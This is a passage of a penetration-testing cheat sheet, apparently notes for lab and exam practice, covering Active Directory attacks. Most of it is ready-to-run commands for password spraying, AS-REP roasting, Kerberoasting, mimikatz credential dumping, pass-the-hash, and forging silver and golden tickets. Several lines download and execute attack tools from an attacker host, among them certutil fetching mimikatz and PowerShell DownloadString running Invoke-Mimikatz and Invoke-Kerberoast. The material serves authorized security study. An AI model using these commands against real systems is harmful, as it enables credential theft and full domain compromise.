├──────────────────┼───────────────────────────────────────────────┤
│ profile          │ /admin/get.php,/news.php,/login/process.php|M │
│                  │ ozilla/5.0 (Windows NT 6.1; WOW64;            │
│                  │ Trident/7.0; rv:11.0) like Gecko              │
├──────────────────┼───────────────────────────────────────────────┤
│ proxy            │                                               │
├──────────────────┼───────────────────────────────────────────────┤
│ servers          │                                               │
├──────────────────┼───────────────────────────────────────────────┤
│ session_id       │ XM8LSE5D                                      │
├──────────────────┼───────────────────────────────────────────────┤
│ session_key      │ &v/]roj#[wsVd^;+yL6Z4li`0IYbk.{:              │
├──────────────────┼───────────────────────────────────────────────┤
│ stale            │ False                                         │
├──────────────────┼───────────────────────────────────────────────┤
│ username         │ DESKTOP-87GBIPQ\admin                         │
├──────────────────┼───────────────────────────────────────────────┤
│ working_hours    │                                               │
└──────────────────┴───────────────────────────────────────────────┘
```

</details>

## 9. Active Directory

### 9.0. Domain enumeration

|   |   |
|---|---|
|Scan for password reuse (domain)|`crackmapexec smb $TARGET -u $USERNAME_LIST -p $PASSWORD -d $DOMAIN`|
|Scan for password reuse (local administrator, hash)|`crackmapexec smb $TARGET_RANGE -u administrator -H $NT_HASH --local-auth`|
|Brute force password|`crackmapexec smb $TARGET -u $USERNAME_LIST -p $PASSWORD_LIST`<br>`kerbrute -users /usr/share/seclists/Usernames/Names/names.txt -password $PASSWORD -domain $DOMAIN -dc-ip $DC_IP`|
|List users|`crackmapexec smb $TARGET -u $USERNAME -p $PASSWORD --users`|

Used in: [Infiltrator](/htb/infiltrator.md)

### 9.1. [AS-REP roasting](/notes/attacking-active-directory.md#1-as-rep-roasting)

|   |   |
|---|---|
|Install [kerbrute](https://github.com/TarlogicSecurity/kerbrute)|`pipx install kerbrute`|
|Find users with preauthentication disabled|`~/.local/bin/kerbrute -users /usr/share/seclists/Usernames/Names/names.txt -domain $DOMAIN -dc-ip $DC_IP`|
|Use GetNPUsers.py to get password hashes|`impacket-GetNPUsers $DOMAIN/$USERNAME -no-pass -dc-ip $DC_IP`|
|Use hashcat to crack the hashes|`hashcat -m 18200 $HASH_FILE /usr/share/wordlists/rockyou.txt`|
|Connec to target|`evil-winrm -i $TARGET -u $USERNAME -p $PASSWORD`<br>`impacket-psexec [$DOMAIN/]$USERNAME:$PASSWORD@$TARGET [$COMMAND]`|

Used in: [Infiltrator](/htb/infiltrator.md)

### 9.2. [Password dumping](/notes/attacking-active-directory.md#2-cached-credential-storage-and-retrieval)

#### 9.2.1. mimikatz.exe

|   |   |
|---|---|
|Prepare file on Kali|`cp /usr/share/windows-resources/mimikatz/x64/mimikatz.exe /var/www/html`|
|Download on target|`certutil.exe -urlcache -f -split http://$KALI/mimikatz.exe %TEMP%\mimikatz.exe`|
|`privilege::debug`|Requests the debug privilege `SeDebugPrivilege`; required to debug and adjust the memory of a process owned by another account|
|`token::elevate`|Impersonates a SYSTEM token (default) or domain admin token (using `/domainadmin`)|
|`lsadump::sam`|Dumps the local Security Account Manager (SAM) NT hashes; operate directly on the target system, or offline with registry hives backups (for SAM and SYSTEM)|
|`lsadump::lsa /patch`|Extracts hashes from memory by asking the LSA server; `/patch` or `/inject` takes place on the fly|
|`sekurlsa::logonpasswords`|Lists all available provider credentials; usually shows recently logged on user and computer credentials|
|`vault::cred /patch`|Enumerates vault credentials (Scheduled Tasks)|
|`lsadump::dcsync /user:domain\krbtgt /domain:$DOMAIN`|Ask a DC to synchronize an object (e.g. `krbtgt`)|

More: <https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Mimikatz.md>

#### 9.2.2. Invoke-Mimikatz

|   |   |
|---|---|
|Prepare file on Kali|`curl -Lo /var/www/html/Invoke-Mimikatz.ps1 https://github.com/PowerShellMafia/PowerSploit/raw/master/Exfiltration/Invoke-Mimikatz.ps1`|
|Execute|`powershell.exe -NoProfile -ExecutionPolicy Bypass -Command "Invoke-Expression (New-Object System.Net.WebClient).DownloadString('http://$KALI/Invoke-Mimikatz.ps1'); Invoke-Mimikatz -DumpCreds"`|

#### 9.2.3. impacket-secretsdump

```sh
impacket-secretsdump [$DOMAIN\]$USERNAME:$PASSWORD@$TARGET
```

#### 9.2.4. crackmapexec

|   |   |
|---|---|
|Domain account, password|`crackmapexec smb $TARGET -u $USERNAME_LIST -p $PASSWORD --lsa`|
|Local administrator, hash|`crackmapexec smb $TARGET_RANGE -u administrator -H $NT_HASH --local-auth --lsa`|

### 9.3. [Pass the hash](/notes/attacking-active-directory.md#3-pass-the-hash)

|   |   |
|---|---|
|evil-winrm|`evil-winrm -i $TARGET -u $USERNAME -H $NT_HASH`|
|impacket-psexec|`impacket-psexec -hashes $LM_HASH:$NT_HASH [$DOMAIN/]$USERNAME@$TARGET [$COMMAND]`|
|pth-winexe|`pth-winexe -U [$DOMAIN/]$USERNAME%$LM_HASH:$NT_HASH //TARGET cmd.exe`|
|sekurlsa::pth + PsExec|`sekurlsa::pth /user:domainadmin /domain:$DOMAINx /ntlm:$NT_HASH`<br>`PsExec \\$TARGET cmd.exe`|

### 9.4. [Kerberoasting](/notes/attacking-active-directory.md#42-kerberoasting)

Option 1: `Invoke-Kerberoast.ps1`

|   |   |
|---|---|
|Prepare file on Kali|`cp /usr/share/powershell-empire/empire/server/data/module_source/credentials/Invoke-Kerberoast.ps1 /var/www/html`|
|Execute on target|`powershell.exe -NoProfile -ExecutionPolicy Bypass "Invoke-Expression (New-Object System.Net.WebClient).DownloadString('http://kali.vx/Invoke-Kerberoast.ps1'); Invoke-Kerberoast -OutputFormat hashcat \| % { $_.Hash } \| Out-File -Encoding ASCII tgs.hash"`|

Option 2: `impacket-GetUserSPNs`

```sh
impacket-GetUserSPNs $DOMAIN/$USERNAME:$PASSWORD -dc-ip $DC_IP -outputfile tgs.hash
```

Cracking service account hash using hashcat

```sh
hashcat -m 13100 tgs.hash /usr/share/wordlists/rockyou.txt
```

### 9.5. Getting tickets

#### 9.5.1. [Silver ticket](/notes/attacking-active-directory.md#43-silver-ticket)

```cmd
whoami /user
mimikatz # kerberos::hash /password:$SERVICE_ACCOUNT_PASSWORD
mimikatz # kerberos::purge
mimikatz # kerberos::golden /user:$USERNAME /domain:$DOMAIN /sid:$DOMAIN_SID /id:$USER_SID /target:$TARGET /service:$SERVICE /rc4:$SERVICE_ACCOUNT_PASSWORD_HASH /ptt
```

#### 9.5.2. [Golden ticket](/notes/attacking-active-directory.md#5-golden-ticket)

Option 1: `impacket`

```sh
impacket-secretsdump -hashes $LM_HASH:$NT_HASH $DOMAIN/$USERNAME@$TARGET
impacket-lookupsid -hashes $LM_HASH:$NT_HASH $DOMAIN/$USERNAME@$TARGET
impacket-ticketer -nthash $KRBTGT_NT_HASH -domain-sid $DOMAIN_SID -domain $DOMAIN administrator
impacket-psexec $DOMAIN/administrator@$TARGET -k -no-pass -target-ip $TARGET_IP -dc-ip $DC_IP
```

Option 2: `mimikatz`

```cmd
whoami /user
mimikatz # privilege::debug
mimikatz # lsadump::lsa /patch
mimikatz # kerberos::purge
mimikatz # kerberos::golden /user:administrator /domain:$DOMAIN /sid:$DOMAIN_SID /krbtgt:KRBTGT_NT_HASH /ptt
mimikatz # misc::cmd
PsExec.exe \\$TARGET cmd.exe
```

## 10. Exam proofs

|OS|Finding|Printing|
|---|---|---|
|Linux|`find / -name proof.txt`|`hostname`<br>`cat /path/to/flag/proof.txt`<br>`ifconfig`|
|Windows|`dir /S C:\*proof.txt`|`hostname`<br>`type C:\path\to\flag\proof.txt`<br>`ipconfig`|
|Windows<br>(PowerShell)|`Get-ChildItem -Path C:\ -Filter *proof.txt -Recurse`|`Get-Content C:\path\to\flag\proof.txt`|
